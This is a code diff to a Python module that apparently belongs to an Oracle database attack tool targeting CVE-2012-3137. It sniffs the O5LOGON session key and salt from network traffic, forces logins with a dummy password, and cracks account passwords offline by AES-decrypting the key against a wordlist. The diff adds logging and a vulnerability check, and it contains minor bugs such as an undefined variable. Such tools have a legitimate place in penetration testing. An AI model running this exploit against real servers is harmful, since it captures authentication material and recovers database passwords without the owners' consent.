@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 import logging, string, re, sys
-from Utils import execSystemCmd, checkOptionsGivenByTheUser
+from Utils import execSystemCmd, checkOptionsGivenByTheUser, anAccountIsGiven
 from OracleDatabase import OracleDatabase
 from time import sleep
 import hashlib
@@ -54,6 +54,7 @@ class CVE_2012_3137 ():
 		'''
 		global sessionKey, salt
 		sessionKey, salt = "", ""
+		logging.debug('Session key and salt are now emply')
 
 	def getKeys(self):
 		'''
@@ -84,7 +85,9 @@ class CVE_2012_3137 ():
 					raw = repr(packet[2].getlayer(scapyall.Raw).load)
 					if "AUTH_SESSKEY" in raw and "AUTH_VFR_DATA" in raw:	
 						sessionKey = re.findall(r"[0-9a-fA-F]{96}" ,raw[raw.index("AUTH_SESSKEY"):raw.index("AUTH_VFR_DATA")])
-						if sessionKey != [] : sessionKey = sessionKey[0]
+						if sessionKey != [] : 
+							sessionKey = sessionKey[0]
+							logging.info ("We have captured the session key: {0}".format(sessionKey))
 						try : authVFRindex = raw.index("AUTH_VFR_DATA")
 						except : logging.warning("The following string doesn't contain AUTH_VFR_DATA: {0}".format(raw))
 						else:
@@ -92,7 +95,9 @@ class CVE_2012_3137 ():
 							except : logging.warning("The following string doesn't contain AUTH_GLOBALLY_UNIQUE_DBID: {0}".format(raw))
 							else:
 								salt = re.findall(r"[0-9a-fA-F]{22}" ,raw[authVFRindex:authGloIndex])
-								if salt != [] : salt = salt[0][2:]
+								if salt != [] : 
+									salt = salt[0][2:]
+									logging.info ("We have captured the salt: {0}".format(salt))
 						finally:
 							return True
 			return False
@@ -101,12 +106,15 @@ class CVE_2012_3137 ():
 		scapyall.sniff(filter="tcp and host {0} and port {1}".format(ip,port), count=self.MAX_PACKET_TO_CAPTURE, timeout=self.TIMEOUT, stop_filter=customAction,store=False)
 		return sessionKey, salt
 
-	def __try_to_connect__(self,args):
+	def __try_to_connect__(self, args):
 		'''
+		Establish a connection to the database
 		'''
 		import cx_Oracle
 		try:
-			cx_Oracle.connect("{0}/{1}@{2}:{3}/{4}".format(self.args['user'],self.args['password'],self.args['server'],self.args['port'],self.args['sid']))
+			connectString = "{0}/{1}@{2}:{3}/{4}".format(self.args['user'], 'aaaaaaa', self.args['server'], self.args['port'], self.args['sid'])
+			logging.debug("Connecting with {0}".format(connectString))
+			cx_Oracle.connect(connectString)
 		except Exception, e:
 			pass
 
@@ -116,9 +124,9 @@ class CVE_2012_3137 ():
 		logging.debug("Sniffing is running in a new thread")
 		a = Thread(None, self.__sniff_sessionkey_and_salt__, None, (), {'ip':self.args['server'],'port':self.args['port']})
 		a.start()
+		logging.debug("Waiting 3 seconds")
 		sleep(3)
-		logging.debug("Connection to the database via a new thread")
-		self.args['user'], self.args['password'] = user, 'a'
+		logging.debug("Connection to the database via a new thread with the username {0}".format(self.args['user']))
 		b = Thread(None, self.__try_to_connect__, None, (), {'args':self.args})
 		b.start()
 		b.join()
@@ -144,18 +152,19 @@ class CVE_2012_3137 ():
 			sleep(self.timeSleep)
 		pbar.finish()
 
+	def __decryptKey__(self, session, salt, password):
+		'''
+		'''
+		pass_hash = hashlib.sha1(password+salt)
+		key = pass_hash.digest() + '\x00\x00\x00\x00'
+		decryptor = AES.new(key,AES.MODE_CBC,'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+		plain = decryptor.decrypt(session)
+		return plain
 
 	def decryptKeys(self, sessionFile, passwdFile):
 		'''
 		decrypt keyx
 		'''
-		def __decryptKey__(session,salt,password):
-			pass_hash = hashlib.sha1(password+salt)
-			key = pass_hash.digest() + '\x00\x00\x00\x00'
-			decryptor = AES.new(key,AES.MODE_CBC,'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
-			plain = decryptor.decrypt(session)
-			return plain
-
 		#Nb sessions
 		fsession, nbsession = open(sessionFile), 0
 		for l in fsession: nbsession+=1
@@ -183,7 +192,7 @@ class CVE_2012_3137 ():
 					nb +=1
 					pbar.update(nb)
 					password = password.replace('\n','').replace('\t','')
-					session_id = __decryptKey__(session_hex.decode('hex'),salt_hex.decode('hex'),password)
+					session_id = self.__decryptKey__(session_hex.decode('hex'),salt_hex.decode('hex'),password)
 					if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
 						self.passwdFound.append([user,password])
 						self.args['print'].goodNews("{0} password:{1}".format(user,password))
@@ -194,13 +203,56 @@ class CVE_2012_3137 ():
 			fsession.close()
 			return self.passwdFound
 
+	def isVulnerable (self, user, password):
+		'''
+		Capture the challenge with the login and tries to recover the password with password
+		Return True if the remote database is vulnerable
+		Return False if not vulnerable.
+		Return an error if an error.
+		'''
+		global sessionKey, salt
+		logging.info("Try to know if the database server is vulnerable to the CVE-2012-3137")
+		sessionKey, salt = "", "" 
+		self.getAPassword(user)
+		if sessionKey != '' and salt != '':
+			logging.info("The challenge captured for the user {0}: key:'{1}', salt='{2}'".format(user, sessionKey, salt))
+			session_id = self.__decryptKey__(sessionKey.decode('hex'),salt.decode('hex'),password)
+			if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
+				logging.info ("The database is vulnerable! Indeed, the result is good when you use the password '{0}' to decrypt the key '{1}' of the user {2} with the salt '{3}'".format(password, sessionKey, user, salt))
+				return True
+			else:
+				logging.info ("The password {0} is not used in the challenge of the user {1}. Consequently, not vulnerable".format(password, user))
+				return False
+		else:
+			logging.info ("The challenge captured is empty")
+			return False
+
 	def testAll (self):
 		'''
 		Test all functions
 		'''
-		self.args['print'].subtitle("CVE-2012-3137 library ?")
-		self.args['print'].unknownNews("I can't know if it is vulnerable")
-
+		self.args['print'].subtitle("Vulnerable to the CVE-2012-3137 ?")
+		#self.args['print'].unknownNews("I can't know if it is vulnerable")
+		if self.args.has_key('user') == False or self.args.has_key('password') == False or self.args['user'] == None or self.args['password'] == None : 
+			self.args['print'].unknownNews("Impossible to know if the database is vulnreable to the CVE-2012-3137.\nYou need to give VALID credentials on the database (-U and -P). Otherwise, the tool can't know if the database is vulnerable...")
+		else:
+			if 1==1:
+				if geteuid() != 0:
+					self.args['print'].unknownNews("Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database")
+				else:
+					vulneable = self.isVulnerable (self.args['user'], self.args['password'])
+					if vulneable == True:
+						self.args['print'].goodNews("OK")
+					elif  vulneable == False:
+						self.args['print'].badNews("KO")
+					else:
+						self.args['print'].badNews("There is an error {0}".format(vulnerable))
+				'''
+				if geteuid() != 0:
+					args['print'].badNews("Sorry, you need to run this as root because I need to sniff authentications to the database")
+				else:
+					args['print'].info("Getting remote passwords on the {0} server, port {1}".format(self.args['server'],self.args['port']))
+		'''
 
 def runCVE20123137Module(args):
 	'''
